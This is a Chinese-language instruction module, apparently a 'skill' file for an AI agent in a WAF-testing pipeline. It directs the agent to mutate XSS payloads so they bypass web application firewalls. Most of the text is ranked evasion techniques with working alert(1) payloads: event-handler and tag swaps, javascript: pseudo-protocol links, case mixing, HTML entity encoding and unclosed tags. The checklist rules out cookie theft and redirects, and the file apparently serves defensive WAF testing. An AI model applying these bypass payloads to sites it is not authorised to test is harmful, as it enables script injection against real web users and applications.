# XSS 语义变异 Skill

## 核心任务

基于漏洞语义理解的结果，提出具体的 XSS `part_operations`，通过改变 XSS Payload 的语法表达方式来绕过 WAF，同时保持原始验证目标。

## 变异策略层次

变异从浅到深分为 4 个层次，**优先使用深层策略**：

### L1：同义替换（最浅——仅改变表面表达）
```
<script> → <img>                           （标签替换）
alert(1) → prompt(1)                       （函数替换）
```

### L2：结构重组（中等——改变 Payload 的语法组织）
```
<script>alert(1)</script> → <svg onload=alert(1)> （标签+事件双重变化）
```

### L3：间接引用与控制流（深层——引入中间层）
```
alert(1) → Function('alert(1)')()          （动态函数构造）
alert(1) → setTimeout('alert(1)')          （定时器包装）
```

### L4：浏览器特性利用（最深——利用浏览器特异性）
```
alert → self[String.fromCharCode(97,108,101,114,116)]  （字符码构造）
<script> → <ScRiPt>                        （大小写混淆）
onerror=alert(1) → onerror=alert&#40;1&#41; （HTML 实体编码）
```

## XSS 变异技术目录

### 技术 1：标签+事件组合变换
- **原理**：改变 HTML 标签和事件处理器的组合
- **适用部件**：标签类型、事件处理器
- **示例**：
  ```
  <script>alert(1)</script>
  → <img src=x onerror=alert(1)>
  → <svg onload=alert(1)>
  → <body onload=alert(1)>
  → <details open ontoggle=alert(1)>
  → <input autofocus onfocus=alert(1)>
  → <marquee onstart=alert(1)>
  → <video><source onerror=alert(1)>
  → <audio src=x onerror=alert(1)>
  → <iframe srcdoc="<script>alert(1)</script>">
  ```

### 技术 2：JS 表达式变换
- **原理**：改变 JavaScript 函数调用方式
- **适用部件**：JS 表达式
- **示例**：
  ```
  alert(1)
  → prompt(1)
  → confirm(1)
  → (alert)(1)
  → window.alert(1)
  → top['alert'](1)
  → self[String.fromCharCode(97,108,101,114,116)](1)
  → Function('alert(1)')()
  → setTimeout('alert(1)')
  → setInterval('alert(1)')
  ```

### 技术 3：标签与属性大小写混合
- **原理**：利用 HTML 大小写不敏感特性
- **适用部件**：标签名、属性名
- **示例**：
  ```html
  <script> → <ScRiPt> → <SCRIPT> → <sCrIpT>
  onerror → oNeRrOr → ONERROR → OnErRoR
  ```

### 技术 4：特殊属性与伪协议
- **原理**：使用支持 JavaScript 伪协议的特殊属性
- **适用部件**：标签属性
- **示例**：
  ```html
  <a href=javascript:alert(1)>
  <iframe src=javascript:alert(1)>
  <embed src=javascript:alert(1)>
  <object data=javascript:alert(1)>
  <form action=javascript:alert(1)>
  <isindex action=javascript:alert(1)>
  ```

### 技术 5：事件处理器变体
- **原理**：使用不同的事件处理器触发 JavaScript
- **适用部件**：事件属性
- **示例**：
  ```html
  onload → onpageshow → DOMContentLoaded → onbeforeload
  onerror → onerror\n=alert → onerror%0a=alert
  onclick → ondblclick → onmousedown → onmouseup
  ```

### 技术 6：无引号属性与编码
- **原理**：省略引号或使用 HTML 实体/转义
- **适用部件**：属性值
- **示例**：
  ```html
  <img src=x onerror=alert(1)>  （无引号）
  <img src=x onerror=alert&#40;1&#41;>  （HTML 实体）
  <img src=x onerror=alert(1)>  （Unicode 转义）
  <img src=x onerror=eval('\x61lert(1)')>  （Hex 转义）
  ```

### 技术 7：标签闭合变体
- **原理**：省略闭合标签或使用注释截断
- **适用部件**：标签结构
- **示例**：
  ```html
  <script>alert(1)</script> → <script>alert(1)//
  <img src=x onerror=alert(1)> → <img src=x onerror=alert(1)//
  <svg><script>alert(1)</script></svg> → <svg><script>alert(1)
  ```

## 变异原则检查清单

每轮提出操作前，确认：
- [ ] 每个操作的目标部件存在且类型正确
- [ ] 不删除 required=true 的部件
- [ ] 至少有一个实质性的语义变化
- [ ] 没有使用编码/解码/转义（属于编码 Agent 的职责）
- [ ] 保持了原始验证目标（如弹窗功能）
- [ ] 没有引入破坏性操作（如窃取 Cookie、重定向）
- [ ] 优先选择 `available_directions` 中未使用的方向
